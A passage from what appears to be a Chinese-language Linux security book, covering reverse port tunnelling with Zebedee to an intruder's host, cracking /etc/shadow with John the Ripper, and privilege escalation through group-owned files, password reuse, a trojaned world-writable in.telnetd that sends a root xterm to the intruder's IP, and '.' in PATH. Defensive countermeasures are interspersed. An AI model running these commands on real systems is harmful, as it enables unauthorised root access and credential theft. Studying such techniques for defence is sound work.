

首先，入侵者必须在其主机上运行以下命令：

```bash
[intruder's_host]$ zebedee -l 3306:*:3306 -T 80
```

现在，入侵者必须在受害主机上运行以下命令：

```bash
[victim_host]$ zebedee -T 80 -c intruder's_ip_address -s 127.0.0.1
```

该命令将导致受害主机上的 Zebedee 服务器进程向入侵者主机上监听 80 端口的 Zebedee 客户端进程发起出站连接。当入侵者连接其机器（127.0.0.1）的 3306 端口时，他将通过 Zebedee 隧道反过来连接到受害者机器的 3306 端口。

> 入侵者可能在受害主机上运行 `ifconfig` 和 `route -n` 命令，以识别允许连接到内部网络的其他网络适配器。入侵者可能使用前一条命令中除 127.0.0.1 以外的内部 IP 地址，对受害者内部网络中主机上监听的端口执行远程端口转发。

## 加固防火墙规则

尽可能收紧您的防火墙规则。务必限制出站连接。例如，仅用作 Web 服务器的主机不允许在任何端口上发起出站连接。

## 破解 /etc/shadow

大多数 Unix 和 Linux 发行版默认使用影子密码，其中加密的密码哈希值存储在 /etc/shadow 文件中。此文件仅根用户可读取。假设入侵者已获取主机的 root 权限，他或她可以使用密码破解工具来破解密码哈希值。

### 使用 John 破解 /etc/shadow

可以使用 John the Ripper 来破解 /etc/passwd：

```bash
[bash]#  john /etc/shadow
Loaded 2 passwords (FreeBSD MD5 [32/32])
tricer4ckkingme             (root)
johnnypwd                   (john)
```

John the Ripper 可在 [http://www.openwall.com/john/](http://www.openwall.com/john/) 获取。

# 使用强密码

请采取以下步骤来加强密码策略并确保使用强密码：

- 强制用户使用强密码。诸如在 http://www.utexas.edu/cc/unix/software/npasswd/ 可用的 `npasswd` 以及在 http://www.openwall.com/passwdqc/ 可用的 `pam_passwdqc` 等工具有助于执行强密码策略。
- 强化允许的密码有效期限和长度。根据您的发行版，编辑 `/etc/default/passwd` 或 `/etc/login.defs` 来实现此目的。
- 考虑使用动态密码方案，如 S/KEY 和 SecurID。

# 总结

本章重点介绍了入侵者用于远程攻陷易受攻击主机的技术。讨论了诸如暴力破解、嗅探、中间人攻击、密码破解、端口重定向、针对错误配置的利用、缓冲区溢出以及其他软件漏洞等策略。一旦入侵者获得了对易受攻击主机的远程访问权限，他或她将试图使用以下章节中描述的方法来维持访问权限并提升权限。

# 第 5 章

# 权限提升

# 本章内容：

- 利用本地信任
- 组成员身份和不正确的文件权限
- PATH 中的 “.”
- 软件漏洞
- 总结

许多漏洞允许入侵者获得对远程主机的非特权访问权限。在获得普通用户权限后，入侵者的下一个逻辑步骤是获取 root（超级用户）访问权限。除了外部入侵者之外，恶意的本地用户也可能试图利用本地漏洞来获得超级用户权限。

将权限提升到超级用户的行为通常被称为权限提升。本章描述了一个具有普通用户权限的人试图获得超级用户权限的方法。

# 利用本地信任

在大多数情况下，防火墙被配置为限制来自外部主机和网络的访问。回环接口（127.0.0.1）上的流量通常不受限制。事实上，过滤回环接口上的流量可能会导致许多应用程序崩溃。本地用户可以利用这一条件为其自身带来优势，并尝试扫描、枚举和利用那些无法远程访问的服务。因此，一旦攻击者获得了主机的本地用户访问权限，他或她可能会尝试本书前面章节中描述的所有黑客技术以提升权限。

# 组成员身份和不正确的文件权限

不正确的文件权限可能允许恶意用户读取或写入他们没有权限访问的文件。以下部分描述了恶意用户如何利用不正确的文件权限来提升其权限。

## 查找组拥有的文件

假设入侵者已获得本地账户 “joe” 的访问权限。他或她可以通过发出 `id` 命令来查看 “joe” 所属的所有组：

```bash
(bash)$ id
uid=500(joe) gid=500(joe) groups=500(joe),501(proj1)
```

在注意到 "joe" 属于 "proj" 组后，入侵者可以发出以下命令，这将列出由 "proj" 组拥有的所有文件：

```bash
[bash]$ find / -group proj -print 2> /dev/null
/var/proj1/main.c
/var/proj1/main.o
/var/proj1/README
/var/proj1/passw.txt
/var/log/proj1
```

现在，入侵者确切地知道了 "proj" 的哪些文件 "joe" 可以访问。其中一个文件 passw.txt 可能显得很有趣：

```bash
[bash]$ more /var/proj1/passw.txt
```

注意，此程序使用系统密码 “r00t3rp455w” 对 MySQL 数据库进行身份验证。

管理员通常会重用密码。如果受害主机的 root 密码与前文中提到的 MySQL 密码相同，那么入侵者可以通过发出 `su` 命令来获得 root 权限：

```bash
[bash]$ su -
Password: r00t3rp455w
[bash]# id
uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon), 3(sys), 4(adm), 6(disk), 10(wheel)
```

## 查找所有用户可读和可写的文件

除了搜索组可读文件外，还可以搜索用户可能可以访问的全体用户可读文件。例如，以下是如何搜索 /etc 目录中所有存在的全体用户可读文件：

```bash
[bash]$ find /etc -type f -perm -4 -print 2> /dev/null
```

/etc 中的许多文件不应该是全体用户可读的。例如，/etc/shadow 文件包含用户的加密密码。任何能够访问此文件的人都可能使用诸如 John the Ripper 等工具暴力破解用户密码。

入侵者可以通过发出以下命令来尝试搜索全体用户可写文件：

```bash
[bash]$ find / -type f -perm -2 -print 2> /dev/null
/usr/sbin/in.telnetd
```

在此示例中，入侵者的 *"joe"* 账户对 in.telnetd 具有写权限。受害主机上的 inetd 或 xinetd 服务每次有传入的 telnet 连接到达主机时，都会调用 in.telnetd 文件。入侵者可以编辑 in.telnetd 文件，并在其中放置以下内容：

```bash
#!/bin/bash
xterm -display intruder_s_ip_address:0.0 &
```

现在，入侵者可以在其主机上执行以下命令：

```bash
xhost +victim_s_ip_address
```

这授予受害机器在其 X 服务器上显示 X 程序的权限。现在入侵者只需要 telnet 到受害主机，这将使 inetd 或 xinetd 以 root 权限调用 /usr/sbin/in.telnetd，从而向入侵者呈现来自受害主机的 root xterm！

![](img/77287f6ef97ef0bed6e23f6610950d06_168_0.png)

### 确保适当的权限

定期审计文件，以确保适当的文件权限。

## PATH 中的 “.”

当用户执行命令时，命令 shell 会在 PATH 环境变量中包含的目录列表中搜索命令的位置：

```bash
[bash]$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/bin:/home/joe/bin:/bin
```

假设 root 用户的当前目录（*"."*）在他的 PATH 中：

```text
…:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin:/bin
```

现在，每当 root 用户执行诸如 `ls` 等命令时，shell 首先在当前目录中查找 *"."*，然后按 PATH 变量中列出的顺序搜索其他目录。

![](img/77287f6ef97ef0bed6e23f6610950d06_168_1.png)

### 利用 PATH 中的 *"."* 植入木马

能够访问本地账户（如 *"joe"*）的恶意用户或入侵者可以创建一个名为 *"ls"* 的文件，并将其放置在受害用户的家目录（*/home/joe*）中，内容如下：

